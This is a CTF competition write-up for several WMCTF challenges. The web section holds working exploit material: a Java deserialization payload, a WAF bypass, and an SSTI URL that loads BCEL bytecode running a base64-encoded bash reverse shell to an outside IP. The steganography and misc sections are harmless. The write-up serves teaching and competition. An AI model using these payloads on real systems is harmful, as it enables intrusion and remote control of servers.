payload=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAPL3RtcC9zZWN1cmUudHh0c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB1cgACW0Ks8xf4BghU4AIAAHhwAAAAFFdlbENvbWUgVG8gV01DVEYyMDIzc3IAPm9yZy5hc3BlY3RqLndlYXZlci50b29scy5jYWNoZS5TaW1wbGVDYWNoZSRTdG9yZWFibGVDYWNoaW5nTWFwO6sCH0tqVloCAANKAApsYXN0U3RvcmVkSQAMc3RvcmluZ1RpbWVyTAAGZm9sZGVydAASTGphdmEvbGFuZy9TdHJpbmc7eHEAfgAAP0AAAAAAAAB3CAAAABAAAAAAeAAAAYms%2ByzRAAAAAnQAAHh0AAFheA%3D%3D
```

The above pass parameter can be written to a file. Then there is the final SSTI, which also has waf

```java
package com.wmctf.javamaster.utils;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

public class WmWaf {
    private List<String> denychar = new ArrayList(Arrays.asList("java.lang", "Runtime", "org.springframework", "javax.naming", "Process", "ScriptEngineManager","+","replace"));
    public boolean securitycheck(String payload) throws UnsupportedEncodingException {
        if (payload.isEmpty()) {
            return false;
        } else {
            String reals = URLDecoder.decode(payload, "UTF-8").toUpperCase(Locale.ROOT);
            for(int i = 0; i < this.denychar.size(); ++i) {
                if (reals.toUpperCase(Locale.ROOT).contains((this.denychar.get(i)).toUpperCase(Locale.ROOT))) {
                    return false;
                }
            }

            return true;
        }
    }

    public WmWaf() {
    }
}

```

Regular payload won't work. Because of the presence of waf. and here is version 3.0.12, some escaping is needed. Finally it is possible to use the `_main` method of `com.sun.org.apache.bcel.internal.util.JavaWrapper` to load the BCEL bytecode, which in turn bounces the shell.

```java
package org.example;

import java.io.IOException;

public class calc {
    public static void _main(String[] argv) throws IOException {
        Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}");
    }

    public static void main(String[] args) {

    }
}

```

Compile to bcel bytecode

```java
package org.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

import java.io.IOException;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main( String[] args ) throws Exception {
        JavaClass javaClass = Repository.lookupClass(calc.class);
        String code = Utility.encode(javaClass.getBytes(), true);
        System.out.println(code);
        Class.forName("$$BCEL$$"+code,true,new ClassLoader());
        //new ClassLoader().loadClass("$$BCEL$$"+code).newInstance();
        //String str="$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmR$5dO$TA$U$3dC$b7$5d$ba$ae$C$c5$ef$_$aab$y$d2$ba$R$88$n$a91i$9ab4$db$WiS$82$3e$98$e92$d9N$d3$dd$r$bb$db$ba$80$fc$u_$d4$f8$e0$P$f0G$Z$ef$b4$84$Sa$92$993s$ee$99s$e7$de$cc$9f$bf$bf$7e$Dx$89$a7$G2$b8m$e0$O$ee$ce$e2$9e$c2$fb$3a$k$e8x$c8$90y$z$7d$Z$bfaH$VV$3a$MZ5$d8$X$Ms$b6$f4Ec$e8uE$d8$e6$dd$B19$3bp$f8$a0$c3C$a9$ce$a7$a4$W$f7d4$8e$85$ae$r$S$ee$j$M$84E2$a7$cc$90$fe$ecq$e93$dc$y$7c$b2$fb$7c$c4$ad$B$f7$5d$ab$V$87$d2w$cb$e3T$3ctG$M$8b$97$84$Z$8cZ$e2$88$83X$G$7e$a4c$89$c4$T3u$87$S$g$ad$60$Y$3abK$aaGdU$c2$X$ca$c3$84$8eY$jy$T$8f$f0$98$81wy$d4$cb$97$9c$fc$b1pzAq$cf$db$3a$e2$d5J$cc$5b$95$d5$f7$b22$fa$f8$b6$b3f$af$ef$f4$9d$eafRo$7f$Y$d6$db$b55$bb_K$9a$ad$8d$c3F$bb$3ej$i9$eb$8d$c3$ca$97m$b9$97$9c$7c$3d$s3$f1j$a3X$da$9f$ec$7b$c5$92$3c1$f1$E$cb$M$f3$ff$97O$d4$b4$a6f$b7$_$9c$98$K$jS2$b0$de5$cf$8acX$98$Kw$86$7e$y$3d$aa$c8pE$7cv$b8QX$b1$_h$a8C$9aH$E$rzV$b8$a4$bb$e7$a8$ed0pD$U$95$a9$ri$fa$Ej$a4$c0T$a3h$cd$d2$c9$od$84$e9$e7$3f$c0$be$d1f$G$G$ad$99$J$89$x$b4$9a$a7$7b$TW$J$b3$b8$869R$a9$cb$9b$84$wf$fc$c4L$$$f5$j$da$ee$d4$c1$m$E$r$caR$aa$a9$8b$81y$y$Q$e6hj$c4$yR$fc$3a$f9M$k$b3JS$a9$$$3c$c4$3cgA$3d$Z$5b$d0$df$g$abn$fd$D$f9$9fP$X$e8$C$A$A";
        com.sun.org.apache.bcel.internal.util.JavaWrapper._main();
    }

}

```

Here you can also use the poc2jar tool

Finally typed in to get a bounce shell, here to access the intranet can build a socks5 proxy, nacos server is no curl.

```
http://172.16.238.81:8686/?type=__%24%7BT%20(com.sun.org.apache.bcel.internal.util.JavaWrapper)._main(%7B%22%24%24BCEL%24%24%24l%248b%24I%24A%24A%24A%24A%24A%24A%24AmR%245dO%24TA%24U%243dC%24b7%245d%24ba%24ae%24C%24c5%24ef%24_%24aab%24y%24d2%24ba%24R%2488%24n%24a91i%249ab4%24db%24WiS%2482%243e%2498%24e92%24d9N%24d3%24dd%24r%24bb%24db%24ba%2480%24fc%24u_%24d4%24f8%24e0%24P%24f0G%24Z%24ef%24b4%2484%24Sa%2492%24993s%24ee%2499s%24e7%24de%24cc%249f%24bf%24bf%247e%24Dx%2489%24a7%24G2%24b8m%24e0%24O%24ee%24ce%24e2%249e%24c2%24fb%243a%24k%24e8x%24c8%2490y%24z%247d%24Z%24bfaH%24VV%243a%24MZ5%24d8%24X%24Ms%24b6%24f4Ec%24e8uE%24d8%24e6%24dd%24B19%243bp%24f8%24a0%24c3C%24a9%24ce%24a7%24a4%24W%24f7d4%248e%2485%24ae%24r%24S%24ee%24j%24M%2484E2%24a7%24cc%2490%24fe%24ecq%24e93%24dc%24y%247c%24b2%24fb%247c%24c4%24ad%24B%24f7%245d%24ab%24V%2487%24d2w%24cb%24e3T%243ctG%24M%248b%2497%2484%24Z%248cZ%24e2%2488%2483X%24G%247e%24a4c%2489%24c4%24T3u%2487%24S%24g%24ad%2460%24Y%243abK%24aaGdU%24c2%24X%24ca%24c3%2484%248eY%24jy%24T%248f%24f0%2498%2481wy%24d4%24cb%2497%249c%24fc%24b1pzAq%24cf%24db%243a%24e2%24d5J%24cc%245b%2495%24d5%24f7%24b22%24fa%24f8%24b6%24b3f%24af%24ef%24f4%249d%24eafRo%247f%24Y%24d6%24db%24b55%24bb_K%249a%24ad%248d%24c3F%24bb%243ej%24i9%24eb%248d%24c3%24ca%2497m%24b9%2497%249c%247c%243d%24s3%24f1j%24a3X%24da%249f%24ec%247b%24c5%2492%243c1%24f1%24E%24cb%24M%24f3%24ff%2497O%24d4%24b4%24a6f%24b7%24_%249c%2498%24K%24jS2%24b0%24de5%24cf%248acX%2498%24Kw%2486%247e%24y%243d%24aa%24c8pE%247cv%24b8QX%24b1%24_h%24a8C%249aH%24E%24rzV%24b8%24a4%24bb%24e7%24a8%24ed0pD%24U%2495%24a9%24ri%24fa%24Ej%24a4%24c0T%24a3h%24cd%24d2%24c9%24od%2484%24e9%24e7%243f%24c0%24be%24d1f%24G%24G%24ad%2499%24J%2489%24x%24b4%249a%24a7%247b%24TW%24J%24b3%24b8%24869R%24a9%24cb%249b%2484%24wf%24fc%24c4L%24%24%24f5%24j%24da%24ee%24d4%24c1%24m%24E%24r%24caR%24aa%24a9%248b%2481y%24y%24Q%24e6hj%24c4%24yR%24fc%243a%24f9M%24k%24b3JS%24a9%24%24%243c%24c4%243cgA%243d%24Z%245b%24d0%24df%24g%24abn%24fd%24D%24f9%249fP%24X%24e8%24C%24A%24A%22%7D)%7D__%3A%3A.x
```



![image-20230801020603797](https://cdn.ha1c9on.top/img/image-20230801020603797.png)

cat flag

```
root@356dc463abec:/# cat WM*
cat WM*
WMCTF{Nac0s_RcE_1s_n0t_D1ffi3ult_4nd_Bc3l_i5_funn7}root@356dc463abec:/# ^C
```

## Steg

### EZ_v1deo

Video LSB, need to be extracted per frame to get the flags.

~~~python
import cv2
import numpy as np

def extract_lsb(frame):
    return frame & 1

def main(input_video, output_video):
    cap = cv2.VideoCapture(input_video)
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fps = int(cap.get(cv2.CAP_PROP_FPS))
    fourcc = cv2.VideoWriter_fourcc(*'XVID')

    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=True)

    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break

        lsb_frame = extract_lsb(frame) * (255, 255, 255)
        out.write(lsb_frame.astype(np.uint8))

    cap.release()
    out.release()
    cv2.destroyAllWindows()

if __name__ == '__main__':
    input_video = 'flag.avi'
    output_video = 'out.avi'
    main(input_video, output_video)
~~~

### Money left me broken

First get the mkv video, the video content identified as a cat face transformation, do not know the parameters, but can be based on the content of the video disruption to determine the range of roughly between 1-10.

Extract one of the frames, write a script blast

```python
import numpy as np
from PIL import Image
import cv2


im = Image.open('frame2.jpg')
im = np.array(im)

def dearnold(img):
    r,c,t = img.shape
    p = np.zeros((r,c,t),dtype=np.uint8)

    for a in range(1, 11):
        for b in range(1, 11):
            for i in range(r):
                for j in range(c):
                    for k in range(t):
                        x = ((a*b+1)*i - b*j)%r
                        y = (-a*i + j)%r
                        p[x,y,k] = img[i,j,k]
            filename = f'new/dearnold{a}_{b}.jpg'
            cv2.imwrite(filename, p)
            print('dearnold{}_{}'.format(a, b))
    return p

dearnold(im)
```

When a, b are equal to 5, the original image is obtained.

At this point prepare to decrypt the video frame by frame.

```python
def dearnold(img):
    r,c,t = img.shape
    p = np.zeros((r,c,t),dtype=np.uint8)
    a = 5
    b = 5
    for i in range(r):
        for j in range(c):
            for k in range(t):
                x = ((a*b+1)*i - b*j)%r
                y = (-a*i + j)%r
                p[x,y,k] = img[i,j,k]
    return p

video   = "output2.mp4"
cap     = cv2.VideoCapture(video)
fps     = cap.get(cv2.CAP_PROP_FPS)
size    = (int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)))
fourcc  = cv2.VideoWriter_fourcc(*'mp4v')
out     = cv2.VideoWriter('return.mp4', fourcc, fps, size)
pbar    = tqdm.tqdm(total=int(cap.get(cv2.CAP_PROP_FRAME_COUNT)))



ret, frame = cap.read()
while ret:
    ret, frame = cap.read()
    if ret:
        frame = dearnold(frame)
        out.write(frame)  # 将处理后的帧写入新的视频文件
        pbar.update(1)
    else:
        break

cap.release()
out.release()
```

The original video can be restored, and two distinct locations can be found in the video

![image-20230721185752437](https://cdn.ha1c9on.top/img/image-20230721185752437.png)

The second half of the flag is available

_I_CAN_GOT_both}

and

![ in](https://cdn.ha1c9on.top/img/image-20230721190053685.png)

and the data parameters of the watermark.



Combined with the content of the topic and the noise of the audio, it can be known as audio dct chunking steganography

However, this watermark requires the original audio, and according to the upper left corner of the video's
watermark, you can easily find the original video address

[【猫猫meme】Lémǒn（Monday Left Me Broken）_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Fh4y1M79t/?spm_id_from=333.337.search-card.all.click)

Just download the original audio and do a dct watermark extraction

```
from scipy.io import wavfile
from scipy.fftpack import dct, idct, fft, fftfreq, ifft
import matplotlib.pyplot as plt
from matplotlib.mlab import window_none


rate, data = wavfile.read('mondy.wav')

rate2, data2 = wavfile.read('output.wav')


data3 = data2- data

#输出data3的频谱图
n_samples = data3.shape[0]
fft_size = 4096
plt.specgram(data3 , fft_size, rate, window=window_none,
                 noverlap=10, scale='dB')

plt.show()

```

can be found divided into four pieces, as well as an alpha multiplier of 0.1, the

![image-20230721191644998](https://cdn.ha1c9on.top/img/image-20230721191644998.png)

While one could continue to script the extraction of the dct, this is all directly visible, so it's a simple matter of handling the sweeps

Get the second part of the flag

WMCTF{Video_Audio

Last flag : WMCTF{Video_Audio_I_CAN_GOT_both}

### perfect two-way foil

First of all, the title for a picture, you can clearly see is the characteristics of the Hilbert curve, so we can guess is the Hilbert curve, and then the size of 512 * 512, at the same time the title of the request is a two-way black box, combined with a lot of black elements of the image and the picture for the RGBA, can be based on the need to take the two-dimensional image of the Hilbert points after the re-combination of the three-dimensional object, and then there are some of the colored elements should be the flag need for the things, and then finally the last three-dimensional objects, we sliced the z-axis of the three-dimensional objects to a general overview of the object, and thus the preparation of scripts:

~~~python
import numpy as np
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D
from PIL import Image

def _hilbert_3d(order):
    def gen_3d(order, x, y, z, xi, xj, xk, yi, yj, yk, zi, zj, zk, array):
        if order == 0:
            xx = x + (xi + yi + zi)/3
            yy = y + (xj + yj + zj)/3
            zz = z + (xk + yk + zk)/3
            array.append((xx, yy, zz))
        else:
            gen_3d(order-1, x, y, z, yi/2, yj/2, yk/2, zi/2, zj/2, zk/2, xi/2, xj/2, xk/2, array)
            gen_3d(order-1, x + xi/2, y + xj/2, z + xk/2, zi/2, zj/2, zk/2, xi/2, xj/2, xk/2, yi/2, yj/2, yk/2, array)
            gen_3d(order-1, x + xi/2 + yi/2, y + xj/2 + yj/2, z + xk/2 + yk/2, zi/2, zj/2, zk/2, xi/2, xj/2, xk/2, yi/2, yj/2, yk/2, array)
            gen_3d(order-1, x + xi/2 + yi, y + xj/2 + yj, z + xk/2 + yk, -xi/2, -xj/2, -xk/2, -yi/2, -yj/2, -yk/2, zi/2, zj/2, zk/2, array)
            gen_3d(order-1, x + xi/2 + yi + zi/2, y + xj/2 + yj + zj/2, z + xk/2 + yk + zk/2, -xi/2, -xj/2, -xk/2, -yi/2, -yj/2, -yk/2, zi/2, zj/2, zk/2, array)
            gen_3d(order-1, x + xi/2 + yi + zi, y + xj/2 + yj + zj, z + xk/2 + yk + zk, -zi/2, -zj/2, -zk/2, xi/2, xj/2, xk/2, -yi/2, -yj/2, -yk/2, array)
            gen_3d(order-1, x + xi/2 + yi/2 + zi, y + xj/2 + yj/2 + zj , z + xk/2 + yk/2 + zk, -zi/2, -zj/2, -zk/2, xi/2, xj/2, xk/2, -yi/2, -yj/2, -yk/2, array)
            gen_3d(order-1, x + xi/2 + zi, y + xj/2 + zj, z + xk/2 + zk, yi/2, yj/2, yk/2, -zi/2, -zj/2, -zk/2, -xi/2, -xj/2, -xk/2, array)

    n = pow(2, order)
    hilbert_curve = []
    gen_3d(order, 0, 0, 0, n, 0, 0, 0, n, 0, 0, 0, n, hilbert_curve)

    return np.array(hilbert_curve).astype('int')

def _hilbert_2d(order):
    def gen_2d(order, x, y, xi, xj, yi, yj, array):
        if order == 0:
            xx = x + (xi + yi)/2
            yy = y + (xj + yj)/2
            array.append((xx, yy))
        else:
            gen_2d(order-1, x, y, yi/2, yj/2, xi/2, xj/2, array)
            gen_2d(order-1, x + xi/2, y + xj/2, xi/2, xj/2, yi/2, yj/2, array)
            gen_2d(order-1, x + xi/2 + yi/2, y + xj/2 + yj/2, xi/2, xj/2, yi/2, yj/2, array)
            gen_2d(order-1, x + xi/2 + yi, y + xj/2 + yj, -yi/2, -yj/2, -xi/2, -xj/2, array)

    n = pow(2, order)
    hilbert_curve = []
    gen_2d(order, 0, 0, n, 0, 0, n, hilbert_curve)

    return np.array(hilbert_curve).astype('int')
# Generate 3D Hilbert curve for order 3
curve = _hilbert_3d(6)
curve_2 = _hilbert_2d(9)

p = np.array(Image.open('out_flag.png').convert('RGBA'))
line = []
for i in curve_2:
    line.append(p[i[0], i[1]])
line = np.array(line)
remake_3d = np.zeros((64,64,64,4), dtype=np.uint8)
for i in range(len(curve)):
    remake_3d[curve[i][0], curve[i][1], curve[i][2], :] = line[i]

for i in range(64):
    pic = Image.fromarray(remake_3d[:,:,i,:])
    pic.save('res/' + str(i) + '.png')
~~~



Slices can be obtained:

![image-20230730145915966](https://cdn.ha1c9on.top/img/image-20230730145915966.png)

We can see that a complete picture exists at layer 31, and dropping it into stegsolve reveals the presence of LSB steganography

![solved](https://cdn.ha1c9on.top/img/solved.bmp)

Finally, zoom in and scan to get the flag

### StegLab-PointAttack 1& 2

http://www.snowywar.top/?p=4258

## Misc

### find me

The title description writes that WearyMeadow made a post via Reddit, which is a prompt to go to Reddit and search for this person to find relevant developments

![](https://cdn.ha1c9on.top/img/64decfcc661c6c8e5439ad99.jpg)

base64 decryption to get attachment address https://ufile.io/670unszp

Don't know the traffic encryption method yet, can't decrypt it

Notice that there is a blog in this person's social links, as well as the avatar is in the style of github, you can know that these two points are more important

First look at the blog, there is only one encrypted article, can not be decrypted for the time being

If you look at the github page, you can see that his blog is actually a github page and that he has two auto-login scripts for his own use.

These two auto-login scripts have leaked his account passwords, and they are the same.

```
usernameStr = 'WearyMeadow'
passwordStr = 'P@sSW0rD123$%^'
```

Here is the security risk of password reuse, directly take this password to decrypt the locked article can be unlocked

You can get the encryption algorithm of the communication service inside, as well as the method of determining the key at the beginning.

```python
def encrypt(message, key):
    seed  = random.randint(0, 11451)
    random.seed(seed)
    encrypted = b''
    for i in range(len(message)):
        encrypted += bytes([message[i] ^ random.randint(0, 255)])
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(pad(encrypted))
    return encrypted
```

Then you can go to the traffic package and find the SUCCESS entry to find the key

```
mysecretkey
```

Encryption is easy, just write a script to blast seed.

```python
import random
from Crypto.Cipher import AES
import string

table = string.printable
text = bytes.fromhex('xxx')

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def is_printable(str_bytes):
    printable_count = 0
    total_count = len(str_bytes)
    
    for byte in str_bytes:
        if byte >= 32 and byte <= 126:
            printable_count += 1
    
    return printable_count / total_count >= 0.8

def decrypt(ciphertext, key):
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = cipher.decrypt(ciphertext)
    res = b''
    for i in range(11452):
        res = b''
        random.seed(i)
        for j in range(len(decrypted)):
            res += bytes([decrypted[j] ^ random.randint(0, 255)])
        if is_printable(res):
            print(res)

key = pad(b'mysecretkey')
decrypt(text, key)
```

Just extract every piece of data in there and blast it to get the flag.

```
WMCTF{OH_Y0u_f1nd_Me__(@_@)}
```

### Random

The grc file can be opened with gnuradio, and after installing it, you can start it directly with gnuradio-companion

Then analyze the logic

![](https://cdn.ha1c9on.top/img/64cb58f01ddac507cc95d530.jpg)

In fact, the logic is very simple, read flag.txt and then bpsk modulation, and then and random than the size and then and random to do the multiplication of the last whole and then do multiplication

It is worth noting that the two random, the first random observation carefully if you can find that he is first multiplied by a -100 and then go than the size, so that this article can be directly ignored, out of the original signal!

The second random is actually a fixed seed for 1919810 and then go to do multiplication, so that this random number is not very random!

So just read the wav, then multiply the whole by the reciprocal of the previous multiplication, then divide with the fixed seed of 1919810, the range is 114~514 random, and finally demodulate it.

dec.grc：

```
options:
  parameters:
    author: zysgmzb
    catch_exceptions: 'True'
    category: '[GRC Hier Blocks]'
    cmake_opt: ''
    comment: ''
    copyright: ''
    description: ''
    gen_cmake: 'On'
    gen_linking: dynamic
    generate_options: qt_gui
    hier_block_src_path: '.:'
    id: dec
    max_nouts: '0'
    output_language: python
    placement: (0,0)
    qt_qss_theme: ''
    realtime_scheduling: ''
    run: 'True'
    run_command: '{python} -u {filename}'
    run_options: prompt
    sizing_mode: fixed
    thread_safe_setters: ''
    title: Not titled yet
    window_size: (1000,1000)
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [8, 8]
    rotation: 0
    state: enabled

blocks:
- name: arity
  id: variable
  parameters:
    comment: ''
    value: '2'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [576, 88.0]
    rotation: 0
    state: enabled
- name: bpsk
  id: variable_constellation
  parameters:
    comment: ''
    const_points: '[-1-1j, -1+1j, 1+1j, 1-1j]'
    dims: '1'
    normalization: digital.constellation.AMPLITUDE_NORMALIZATION
    precision: '8'
    rot_sym: '4'
    soft_dec_lut: None
    sym_map: '[0, 1, 3, 2]'
    type: bpsk
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [24, 120.0]
    rotation: 0
    state: true
- name: excess_bw
  id: variable
  parameters:
    comment: ''
    value: '0.35'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [336, 88.0]
    rotation: 0
    state: enabled
- name: freq_offset
  id: variable
  parameters:
    comment: ''
    value: '0.001'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [264, 152.0]
    rotation: 0
    state: true
- name: nfilts
  id: variable
  parameters:
    comment: ''
    value: '32'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [504, 88.0]
    rotation: 0
    state: enabled
- name: noise_volt
  id: variable
  parameters:
    comment: ''
    value: '0.01'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [176, 152.0]
    rotation: 0
    state: true
- name: phase_bw
  id: variable
  parameters:
    comment: ''
    value: '0.0628'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [576, 152.0]
    rotation: 0
    state: true
- name: rrc_taps
  id: variable
  parameters:
    comment: ''
    value: firdes.root_raised_cosine(nfilts, nfilts, 1.0/float(sps), 0.35, 45*nfilts)
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [648, 88.0]
    rotation: 0
    state: enabled
- name: samp_rate
  id: variable
  parameters:
    comment: ''
    value: '32000'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [184, 12]
    rotation: 0
    state: enabled
- name: samp_rate_0
  id: variable
  parameters:
    comment: ''
    value: '32000'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [176, 88.0]
    rotation: 0
    state: enabled
- name: sps
  id: variable
  parameters:
    comment: ''
    value: '4'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [264, 88.0]
    rotation: 0
    state: enabled
- name: taps
  id: variable
  parameters:
    comment: ''
    value: '[1.0 + 0.0j, ]'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [432, 88.0]
    rotation: 0
    state: enabled
- name: time_offset
  id: variable
  parameters:
    comment: ''
    value: '1.0'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [360, 152.0]
    rotation: 0
    state: true
- name: timing_loop_bw
  id: variable
  parameters:
    comment: ''
    value: '0.0628'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [456, 152.0]
    rotation: 0
    state: true
- name: analog_random_uniform_source_x_1
  id: analog_random_uniform_source_x
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    maximum: '514'
    maxoutbuf: '0'
    minimum: '114'
    minoutbuf: '0'
    seed: '1919810'
    type: int
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [64, 476.0]
    rotation: 0
    state: true
- name: blocks_delay_0
  id: blocks_delay
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    delay: '3'
    maxoutbuf: '0'
    minoutbuf: '0'
    num_ports: '1'
    type: byte
    vlen: '1'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [792, 480.0]
    rotation: 0
    state: enabled
- name: blocks_divide_xx_0
  id: blocks_divide_xx
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    maxoutbuf: '0'
    minoutbuf: '0'
    num_inputs: '2'
    type: float
    vlen: '1'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [440, 332.0]
    rotation: 0
    state: true
- name: blocks_file_sink_0
  id: blocks_file_sink
  parameters:
    affinity: ''
    alias: ''
    append: 'False'
    comment: ''
    file: /mnt/c/Users/16334/Desktop/flag.out
    type: byte
    unbuffered: 'False'
    vlen: '1'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [928, 492.0]
    rotation: 0
    state: enabled
- name: blocks_float_to_complex_0
  id: blocks_float_to_complex
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    maxoutbuf: '0'
    minoutbuf: '0'
    vlen: '1'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [528, 248.0]
    rotation: 0
    state: enabled
- name: blocks_int_to_float_2
  id: blocks_int_to_float
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    maxoutbuf: '0'
    minoutbuf: '0'
    scale: '1'
    vlen: '1'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [264, 396.0]
    rotation: 0
    state: true
- name: blocks_multiply_const_vxx_0
  id: blocks_multiply_const_vxx
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    const: '1000'
    maxoutbuf: '0'
    minoutbuf: '0'
    type: float
    vlen: '1'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [272, 252.0]
    rotation: 0
    state: true
- name: blocks_wavfile_source_0
  id: blocks_wavfile_source
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    file: /mnt/c/Users/16334/Desktop/flag.wav
    maxoutbuf: '0'
    minoutbuf: '0'
    nchan: '1'
    repeat: 'False'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [40, 308.0]
    rotation: 0
    state: true
- name: digital_constellation_decoder_cb_0
  id: digital_constellation_decoder_cb
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    constellation: bpsk
    maxoutbuf: '0'
    minoutbuf: '0'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [904, 356.0]
    rotation: 0
    state: enabled
- name: digital_costas_loop_cc_0
  id: digital_costas_loop_cc
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    maxoutbuf: '0'
    minoutbuf: '0'
    order: arity
    use_snr: 'False'
    w: phase_bw
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [992, 152.0]
    rotation: 0
    state: enabled
- name: digital_diff_decoder_bb_0
  id: digital_diff_decoder_bb
  parameters:
    affinity: ''
    alias: ''
    coding: digital.DIFF_DIFFERENTIAL
    comment: ''
    maxoutbuf: '0'
    minoutbuf: '0'
    modulus: '2'
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [600, 420.0]
    rotation: 0
    state: enabled
- name: digital_pfb_clock_sync_xxx_0
  id: digital_pfb_clock_sync_xxx
  parameters:
    affinity: ''
    alias: ''
    comment: ''
    filter_size: nfilts
    init_phase: nfilts/2
    loop_bw: timing_loop_bw
    max_dev: '1.5'
    maxoutbuf: '0'
    minoutbuf: '0'
    osps: '1'
    sps: sps
    taps: rrc_taps
    type: ccf
  states:
    bus_sink: false
    bus_source: false
    bus_structure: null
    coordinate: [688, 180.0]
    rotation: 0
    state: enabled

connections:
- [analog_random_uniform_source_x_1, '0', blocks_int_to_float_2, '0']
- [blocks_delay_0, '0', blocks_file_sink_0, '0']
- [blocks_divide_xx_0, '0', blocks_float_to_complex_0, '0']
- [blocks_float_to_complex_0, '0', digital_pfb_clock_sync_xxx_0, '0']
- [blocks_int_to_float_2, '0', blocks_divide_xx_0, '1']
- [blocks_multiply_const_vxx_0, '0', blocks_divide_xx_0, '0']
- [blocks_wavfile_source_0, '0', blocks_multiply_const_vxx_0, '0']
- [digital_constellation_decoder_cb_0, '0', digital_diff_decoder_bb_0, '0']
- [digital_costas_loop_cc_0, '0', digital_constellation_decoder_cb_0, '0']
- [digital_diff_decoder_bb_0, '0', blocks_delay_0, '0']
- [digital_pfb_clock_sync_xxx_0, '0', digital_costas_loop_cc_0, '0']

metadata:
  file_format: 1
  grc_version: 3.10.5.1
```

![](https://cdn.ha1c9on.top/img/64cb59f61ddac507cc9867ee.jpg)

The other parameters, if you search for the bpsk implementation in gnuradio, are actually the ones used in the official example

https://wiki.gnuradio.org/index.php/Simulation_example:_BPSK_Demodulation

The demodulation is also done according to the official example.

The resulting file is binary decoded and you get a bunch of flags with individual errors.

![](https://cdn.ha1c9on.top/img/64cb5abb1ddac507cc9a7986.jpg)

Observe that the flag is 32 bits

Here we just need to analyze each bit of the flag to see which character is the most frequent.

Finally, we get the flag

```
WMCTF{S1gnal_1s_Fun_5AC7DC76CB9}
```

### Truncate

Found out it's a memory image for linux, using volatility2 here, do the profile first

Refer to https://heisenberk.github.io/Profile-Memory-Dump/

If you can't find the systemmap, go to https://debian.sipwise.com/debian-security/pool/main/l/linux/上面下载对应版本的.

Once the profile is done, we can start forensics.

First, let's look at the command line log

```
